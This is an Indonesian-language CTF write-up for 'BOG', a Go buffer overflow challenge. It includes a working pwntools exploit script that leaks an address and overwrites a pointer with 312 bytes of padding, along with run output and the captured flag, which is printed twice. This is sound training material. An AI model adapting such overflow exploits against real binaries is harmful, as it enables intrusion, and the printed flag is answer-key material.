# BOG (441 Pts)

- [BOG](#bog)
- [Deskripsi](#deskripsi)
- [Konsep soal](#konsep-soal)
- [HINT](#hint)
- [Proof of Concept](#proof-of-concept)
- [Refrensi](#refrensi)

## Deskripsi
Hanya Berbeda Pabrik

Format Flag : Hology4{}

Author : **Dolf7**

## Konsep soal
- Buffer Overflow
- Buffer Overwrite

Merupakan vulnerablity Buffer Overflow yang menggunakan bahasa Go (GoLang) yang menjadi tantangan tersendiri bagi peserta. Selain itu Untuk dapat menetukan berapa banyak buffer yang dibutuhkan digunakan sedikit teknik logika pemrograman. dalam soal ini dibuthkan pengetahuan terhadap bahas GoLang dan keterampilan menggunakan pwntools

## HINT
Tidak ada

## Proof of Concept
```
from pwn import *
p = process('./vuln')

elf = ELF('vuln')

paygo = 56

while 1:
    p.sendline(b'1')
    x2 = p.recvline()
    x3 = p.recvline()
    x2 = int(int(x2[:-1]))
    x3 = int(int(x3[:-1]))
    ab = int((x2^x3)/5)
    if( ab > 256 + paygo + 8):
        break
p.sendline(b'3')
load0 = p.recvline()
load = p64(int(load0[:-1], 16))
buff = (b'A'*(256 + paygo))
payload = buff + load
p.sendline(payload)
p.interactive()
```

ouput :
```
$ python3 solve.py 
dolf@dolf:~/Documents/POROS/Hology4/BOG$ python3 solve.py 
[+] Starting local process './vuln': pid 14406
[!] Did not find any GOT entries
[*] '/home/dolf/Documents/POROS/Hology4/BOG/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
hology4{GOl4ng_i5_quit3_4l1_right}

unexpected fault address 0xc00002200a
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x2 addr=0xc00002200a pc=0xc00002200a]
```

## Refrensi
- https://dev.to/jlauinger/exploitation-exercise-with-unsafe-pointer-in-go-information-leak-part-1-1kga
  
- https://dev.to/jlauinger/exploitation-exercise-with-go-unsafe-pointer-code-flow-redirection-part-2-5hgm


## Deployment

```
docker build -t bog .
docker run -dp 34465:34465 --name bog bog
crontab /path/to/crontab
```

## Flag
<details>
<summary>Tekan untuk melihat flag</summary>

    hology4{GOl4ng_i5_quit3_4l1_right}

</details>